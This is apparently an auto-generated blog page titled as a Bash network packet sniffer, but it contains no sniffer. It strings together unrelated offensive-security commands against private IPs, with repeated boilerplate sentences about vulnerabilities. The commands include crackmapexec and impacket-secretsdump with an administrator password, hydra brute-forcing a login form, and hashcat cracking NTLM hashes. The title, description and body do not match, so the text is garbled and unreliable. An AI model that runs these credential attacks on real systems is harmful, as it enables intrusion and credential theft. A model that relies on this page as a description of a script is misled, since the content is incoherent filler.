---
TitleSEO: "Network Packet Sniffer in Bash | ZureFX"
TitlePost: "Network Packet Sniffer — Bash"
Author: "ZureFX"
Description: "A Bash script for network packet sniffer. Built for security research and automation."
Keywords: "python, fuzzer, bash, scanner, automation"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-613.html"
URL_IMAGES: ""
Date: "2025-11-19"
Tags: "Python, Fuzzer, Bash, Scanner, Automation"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-613"
Permalink: "/scripting/script-network-packet-sniffer-613.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `smbclient`
- `gobuster`
- `john`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
crackmapexec smb 10.93.168.190 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p80,8080,5986 10.61.247.109 -oN scan.txt
crackmapexec smb 10.76.225.118 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.5.234 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.116.232.54/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p389,80,139 10.106.57.7 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.27.206.170
gobuster dir -u http://10.33.131.116/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p445,993,5986 10.95.239.8 -oN scan.txt
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
crackmapexec smb 10.87.47.169 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 2.43s
```
